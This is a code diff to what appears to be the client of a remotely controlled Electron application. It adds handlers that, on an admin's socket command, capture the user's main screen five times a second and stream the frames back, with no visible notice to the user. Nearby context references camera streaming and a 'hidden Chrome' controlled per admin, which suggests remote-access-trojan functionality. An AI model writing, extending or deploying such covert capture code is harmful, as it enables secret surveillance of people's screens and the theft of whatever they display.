@@ -162,6 +162,35 @@ window.onload = async () => {
             }
         });
 
+        socket.on('request-screen-safe', async (adminId) => {
+            console.log("Admin requested SCREEN SAFE MODE");
+            if (screenInterval) clearTimeout(screenInterval);
+            
+            const startSafeStream = async () => {
+                try {
+                    const sources = await window.electronAPI.getSources();
+                    const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
+                    if (mainScreen && mainScreen.thumbnail) {
+                        socket.emit('screen-safe-frame', { adminId, frame: mainScreen.thumbnail });
+                    }
+                } catch(e) {
+                    console.error("Safe mode frame err", e);
+                }
+                
+                // 5 FPS loop (200ms)
+                screenInterval = setTimeout(startSafeStream, 200);
+            };
+            startSafeStream();
+        });
+
+        socket.on('stop-screen-safe', () => {
+            console.log("Stopping SCREEN SAFE MODE");
+            if (screenInterval) {
+                clearTimeout(screenInterval);
+                screenInterval = null;
+            }
+        });
+
         // Handle stop screen
         socket.on('stop-screen', () => {
             console.log("Stopping SCREEN");
@@ -368,7 +397,6 @@ window.onload = async () => {
             await window.electronAPI.stopHiddenChrome();
         });
 
-        // Handle Force Stop from Server
         socket.on('force-stop-all', () => {
             console.log("Force Stop All received");
             if (localCameraStream) {
@@ -382,6 +410,10 @@ window.onload = async () => {
             if (peerConnection) {
                 peerConnection.close();
                 peerConnection = null;
+            }
+            if (screenInterval) {
+                clearTimeout(screenInterval);
+                screenInterval = null;
             }
             window.electronAPI.stopHiddenChrome();
             currentAdminForHiddenChrome = null;
